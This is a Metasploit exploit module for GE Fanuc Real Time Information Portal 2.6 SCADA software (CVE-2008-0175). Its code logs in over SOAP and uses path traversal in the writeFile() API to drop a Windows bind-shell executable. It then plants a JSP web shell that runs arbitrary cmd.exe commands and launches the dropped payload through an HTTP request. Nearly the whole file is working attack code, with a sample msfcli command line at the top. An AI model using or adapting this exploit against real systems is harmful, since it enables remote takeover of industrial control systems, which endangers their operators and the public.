##
# $Id: hooked_on_fanucs.rb
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the
#Metasploit
# Framework web site for more information on licensing and terms of
#use.
# http://metasploit.com/projects/Framework/
##

# msfcli exploit/windows/misc/hooked_on_fanucs USERNAME=booyaaaaaa
PASSWORD=kakakabbb DOMAIN=AAAzzz PAYLOAD=windows/shell_bind_tcp
RHOST=x.x.x.x E

require 'msf/core'
require 'soap/rpc/driver'
require 'soap/filter'

# Must have httpaccess2 for this to work
class CookieFilter < SOAP::Filter::StreamHandler
	attr_accessor :cookie_value

	def initialize
		@cookie_value = nil
 	end

 	def on_http_outbound(req)
   		req.header['Cookie'] = @cookie_value if @cookie_value
 	end

 	def on_http_inbound(req, res)
   		cookie = res.header['Set-Cookie'][0]
   		cookie.sub!(/;.*\z/, '') if cookie
   		@cookie_value = cookie
 	end
end

class Metasploit3 < Msf::Exploit::Remote
	include Msf::Exploit::Remote::Tcp
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Hooked on Fanucs - GE
Fanuc Real Time Information Portal 2.6 writeFile() API exploit',
			'Description'    => %q{
					This module exploits an API
flaw in GE Fanuc SCADA software 
			},
			'Author'         => [ 'Matthew Franz
<mdfranz[at]gmail.com>' ],
			'Version'        => '$Revision: 20081031 $',
			'References'     => 
				[
					['CVE', '2008-0175'],
					['URL',
'http://support.gefanuc.com/support/index?page=kbchannel&id=KB12460'],
					['URL',
'http://www.tenablesecurity.com/training/'],
					['URL',
'http://blogfranz.blogspot.com/'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Targets'        =>
                                [
                                        [ 'GE Fanuc Real Time
Information Portal 2.6', { 'Payload' => { 'Space' => 4000 } } ],
                                ],
                        'DefaultTarget'  => 0,
			'Platform'       => 'win',
			'Privileged'     => false
			))

			register_options(
                        [
                                Opt::RPORT(80),
                                OptString.new('USERNAME', [ true, "The
Username", "Administrator" ]),
                                OptString.new('PASSWORD', [ true, "The
Password", "Password" ]),
                                OptString.new('DOMAIN', [ true, "The
Domain", "Domain" ])
                        ], self.class)

	end

	def exploit

		namespace = 'urn:iFixWeb'
		endpoint = 'http://' + datastore['RHOST'] +
'/infoAgentSrv/iFixWeb'
		proxy    = SOAP::RPC::Driver.new(endpoint,namespace)
		proxy.streamhandler.filterchain << CookieFilter.new
		proxy.wiredump_dev = STDERR # Enable this for XML
output

		proxy.add_method('writeFile', 'writeFile', 'p2', 'p3')
		proxy.add_method('login', 'login', 'p2', 'p3', 'p4')
		proxy.add_method('logout')
		proxy.add_method('getFileList', 'getFileList', 'p2')
		proxy.add_method('deleteFile', 'deleteFile', 'p2')

		proxy.login(datastore['USERNAME'],
Rex::Text.encode_base64(datastore['PASSWORD'],''),
datastore['DOMAIN'],true)
	    
                bin = Rex::Text.to_win32pe(payload.encoded, '')
                cmd =  Rex::Text.encode_base64(bin,'')

		proxy.writeFile('..\\..\\..\\..\\..\\..\\..\\..\\.\\..\\blogfranz.exe',cmd,false)
		proxy.getFileList('..\\..\\..\\..\\..\\..\\..\\..\\.\\..\\blogfranz.exe', 1)

		jspshell = '<FORM METHOD=GET
ACTION=\'franzshell.jsp\'>
		<INPUT name=\'cmd\' type=text>
		<INPUT type=submit value=\'Run\'>
		</FORM>
		<%@ page import="java.io.*" %>
		<%
			String cmd = request.getParameter("cmd");
			String output = "";
			if(cmd != null) {
				String s = null;
				try {
					Process p =
Runtime.getRuntime().exec("cmd.exe /C " + cmd);
					BufferedReader sI = new
BufferedReader(new InputStreamReader(p.getInputStream()));
					while((s = sI.readLine()) !=
null) {
						output += s;
					}
				}
				catch(IOException e) {
					e.printStackTrace();
				}
			}
		%>
		<pre>
		<%=output %>
		</pre>'

		proxy.writeFile('franzshell.jsp',
Rex::Text.encode_base64(jspshell,''),false)
		proxy.logout	
	   
		print_status("Sleeping for 10 seconds... allowing
shell to be written to the file system")
		sleep 10 

		connect

                sock.put("GET
/infoAgentSrv/franzshell.jsp?cmd=c:\\blogfranz.exe HTTP/1.0\r\n\r\n")
                resp = sock.get_once

		print_status(resp)

		print_status("Hooked on Fanucs works for me!")

                disconnect
		handler
                              
	end

end

